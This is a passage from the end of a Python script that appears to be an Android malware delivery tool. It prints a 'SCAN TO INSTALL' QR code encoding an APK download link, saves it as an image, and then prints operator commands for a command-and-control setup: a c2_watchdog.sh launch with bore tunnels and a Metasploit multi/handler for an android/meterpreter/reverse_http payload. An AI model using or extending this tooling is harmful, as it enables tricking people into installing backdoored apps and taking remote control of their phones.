        # ASCII QR for immediate terminal delivery
        try:
            import qrcode as _qr  # type: ignore
            print(f"\n    {'═' * 54}")
            print(f"    SCAN TO INSTALL")
            print(f"    {'═' * 54}")
            qr = _qr.QRCode(version=None,
                             error_correction=_qr.constants.ERROR_CORRECT_L,
                             box_size=10, border=2)
            qr.add_data(apk_url)
            qr.make(fit=True)
            qr.print_ascii(out=None)
            print("", flush=True)
            qr_png = OUT_DIR / "apk_delivery.png"
            qr.make_image(fill_color="black", back_color="white").save(str(qr_png))
            print(f"    QR PNG saved: {qr_png}")
        except ImportError:
            print(f"    (Install qrcode for QR output: pip3 install qrcode[pil])")
        except Exception as e:
            print(f"    (QR generation failed: {e})")

        print(f"\n    WAN C2 stack (bore tunnels + MSF handler):")
        print(f"      bash ../c2_persistence/c2_watchdog.sh \\")
        print(f"        --bore-dex-port {args.bore_dex_port} \\")
        print(f"        --bore-msf-port {args.bore_msf_port} \\")
        print(f"        --msf-port {args.msf_lport} \\")
        print(f"        --dex-dir output/ --notify")
        print(f"")
        print(f"    MSF handler (standalone):")
        print(f"      msfconsole -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_http; "
              f"set LHOST 0.0.0.0; set LPORT {args.msf_lport}; run'")


if __name__ == "__main__":
    main()
